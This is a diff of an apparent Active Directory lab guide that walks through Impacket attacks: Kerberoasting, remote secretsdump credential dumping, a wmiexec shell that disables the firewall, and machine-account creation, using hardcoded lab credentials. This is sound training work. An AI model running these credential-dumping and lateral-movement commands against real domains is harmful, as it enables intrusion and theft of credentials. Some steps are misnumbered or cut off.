@@ -277,7 +277,7 @@ DonPAPI -h
 
 # BadBlood
 
-
+This tool makes a mess out of an existing lab environment, your production AD, or anywhere you run this. ** This is dangerous DO NOT RUN IN PRODUCTION ** 
 
 ### &#x1FA9F; Windows credentials
 
@@ -343,4 +343,263 @@ exit
 
 # GO SPEEDRACER GO!!!!!!
 
+<!-- DO-CREDENTIAL-REMINDER-START -->
+<Details><summary>
 
+## &#x1F512; Lab Credentials
+
+</summary><blockquote>
+
+### &#x1FA9F; Windows credentials
+
+When logging into the Windows system, use the following credentials.
+
+```Win-creds
+doazlab\doadmin
+DOLabAdmin1!
+```
+
+### &#x1F427; Linux credentials
+
+When logging into the Linux system, use the following credentials.
+
+```Linux-creds
+doadmin
+DOLabAdmin1!
+```
+
+</blockquote></details>
+<!-- DO-CREDENTIAL-REMINDER-END -->
+
+## &#x2460; Activate Impacket Virtual Environment 
+
+</summary><blockquote>
+
+_Conduct Lab Operations from Linux Host Nux01_
+
+Prepare the Python virtual environment (venv) to containerize Impacket's dependencies. Run the following commands to activate the environment and list the tools of Impacket.
+
+Ensure you are root with sudo. 
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+sudo -s
+```
+
+Run the next commands as a codeblock to instantiate the venv and list the Python tools in the impacket repo.
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+deactivate
+cd /opt/impacket
+source /root/pyenv/impacket/bin/activate
+cd /opt/impacket/examples
+ls
+```
+
+| ![Virtual Environment Activation](img/venv-activate.jpg) | 
+|------------------------------------------------|
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
+
+## &#x2462; Interrogate Service Principals 
+
+</summary><blockquote>
+
+Get-UserSPNs is similar in that all members of the "Domain Users" group can request a service ticket for any account with a configured service principal name (SPN). This is the attack known as "Kerberoasting". The krbtgt's response to the requested service ticket operation includes a potentially crackable password hash.
+
+Let's gather hashes from the accounts running with assigned service principal names (SPNs). Why? These are the accounts that any domain user can request Kerberos service tickets for. Thus, the Kerberoast attack.
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+mkdir /opt/hashes/
+GetUserSPNs.py 'doazlab.com'/'doadmin':'DOLabAdmin1!' -dc-ip 192.168.2.4 -outputfile /opt/hashes/kerbs.txt
+cat /opt/hashes/kerbs.txt |less -S
+```
+
+| ![getUserSPNs](img/getuserspns.jpg) |
+|------------------------------------------------|
+
+Use either `CTRL + C` or `q` to exit this view.
+
+The SPN hashes were saved to file /opt/hashes/kerbs.txt
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
+
+
+<Details><summary>
+
+## &#x2463; Secretsdump Remote Access
+
+</summary><blockquote>
+
+We are next going to take some liberties with our privileged position to check out Secretsdump. This tool will attempt to gather credential material from a remote system to which the analyst has recovered some form of privileged credentials.
+
+The account credential used to access the environment has sufficient privilege to start the RemoteRegistry service and access credential material through the various secrets storage locations in Microsoft's operating systems. The next command uses secretsdump.py to attempt a remote credential dump and the tee -a command to write STDOUT to a file in the /opt/hashes/ directory.
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+mkdir /opt/hashes 
+secretsdump.py doazlab/doadmin@192.168.2.5 |tee -a /opt/hashes/secrets-output.txt
+```
+
+You will be prompted for a password. 
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+DOLabAdmin1!
+```
+
+| ![Secretsdump](img/secretsdump1.jpg) |
+|------------------------------------------------|
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
+
+
+
+<Details><summary>
+
+## &#x2465; Establish Semi-Interactive WMIC Shell
+
+</summary><blockquote>
+
+
+
+The wmiexec.py utility establishes a semi-interactive shell to a remote host. This is not an opsec safe tool and will get caught by most EDR products.
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+python3 wmiexec.py doazlab.com/doadmin@192.168.2.5
+```
+
+You will be prompted for a password.
+
+```bash
+DOLabAdmin1!
+```
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+net localgroup administrators
+ipconfig
+whoami
+hostname
+nslookup doazlab.com
+netsh advfirewall set allprofiles state off
+exit
+
+```
+
+| ![wmiexec.py Connection](img/wmiexec.jpg) |
+|------------------------------------------------|
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
+
+
+
+<Details><summary>
+
+## &#x2466; Request a Ticket as doadmin 
+
+</summary><blockquote>
+
+
+
+The getTGT.py utility is used to request authentication tickets (Kerberos) from a known username and password (or hash) combination. 
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+python3 getTGT.py -dc-ip 192.168.2.4 doazlab.com/doadmin:'DOLabAdmin1!'
+```
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+ls
+export KRB5CCNAME=/opt/impacket/examples/doadmin.ccache
+```
+
+| ![Request TGT for noprivuser](img/get-tgt-nopriv.jpg) |
+|------------------------------------------------|
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
+
+
+
+<Details><summary>
+
+## &#x2467; Add Computer Object via Kerberos Authentication
+
+</summary><blockquote>
+
+Let's use the Kerberos ticket we grabbed with getTGT.py to add a computer object to the domain. Always remember - any user can add up to ten computers to a domain by default (MS-DS-MachineAccountQuota). Trust us, you need to learn to how to use
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+python3 addcomputer.py -computer-name lowprivPC -computer-pass L0wPr1VSys -k -no-pass -dc-ip 192.168.2.4 doazlab.com/doadmin@192.168.2.4 -dc-host dc01
+```
+
+| ![Add computer to the domain using doadmin's Kerberos ticket](img/add-machine-acct.jpg) |
+|------------------------------------------------|
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
+
+
+
+<Details><summary>
+
+## &#x2468; Use Net.py 
+
+</summary><blockquote>
+
+The regsecrets.py utility was designed as an improvement on the secretsdump.py utility. Regsecrets.py conducts a fileless interrogation of a targeted system's registry. 
+<br />
+
+Take a look at the tool's help file too. Kent says: "Know your tools."
+
+
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+python3 net.py
+```
+
+Use the following command to quietly and filelessly dump creds from the WS05 system. 
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+python3 regsecrets.py 
+```
+
+
+&#x21E8; *Step Complete, Go to the next step!*
+
+</blockquote></details>
